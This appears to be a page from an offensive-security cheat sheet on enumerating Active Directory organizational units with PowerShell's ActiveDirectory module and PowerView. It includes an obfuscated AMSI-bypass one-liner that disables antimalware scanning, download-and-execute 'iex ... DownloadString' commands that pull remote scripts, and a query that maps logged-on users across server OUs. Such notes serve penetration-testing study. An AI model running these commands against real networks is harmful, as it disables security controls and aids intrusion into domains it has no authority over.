---
title: "Domain OUs"
description: "Enumerating domain OUs."
lead: "Enumerating information about domain OUs using the ActiveDirectory PowerShell module and PowerView."
date: 2021-11-07T18:09:27+01:00
lastmod: 2021-11-07T18:09:27+01:00
draft: false
images: []
menu: 
  active_directory:
    parent: "domain_enumeration"
weight: 40
toc: true
---

## ActiveDirectory Module

### Setup

```powershell
# If computer has internet access
iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory

# If computer has no internet access, download repository
Import-Module .\ADModule\Microsoft.ActiveDirectory.Management.dll -Verbose
Import-Module .\ADModule\ActiveDirectory\ActiveDirectory.psd1

# Check if module has been imported correctly
Get-Command -Module ActiveDirectory
```

### Commands

```powershell
# Get OUs in a domain
Get-ADOrganizationalUnit -Filter * -Properties *

# Get GPO applied on an OU. Read GPOName from gplink attribute from Get-NetOU
Get-GPO -GUID "AB306569-220D-43FF-B03B-83E8F4EF8081"
```

## PowerView

### Setup

```powershell
# If it gets blocked by AMSI we can bypass it with
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )

# Then load the module
Import-Module .\PowerView.ps1
. .\PowerView.ps1

# With internet access
iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1')
```

### Commands

```powershell
# Get OUs in a domain
Get-NetOU -FullData

# Get GPO applied on an OU. Read GPOName from gplink attribute from Get-NetOU
Get-NetGPO -GPOname "{AB306569-220D-43FF-B03B-83E8F4EF8081}"

# Find all computers in a given OU
Get-DomainComputer -SearchBase "ldap://OU=..."

# Get the logged on users for all machines in any *server* OU in a particular domain
Get-DomainOU -Identity *server* -Domain <domain> | %{Get-DomainComputer -SearchBase $_.distinguishedname -Properties dnshostname | %{Get-NetLoggedOn -ComputerName $_}}
```
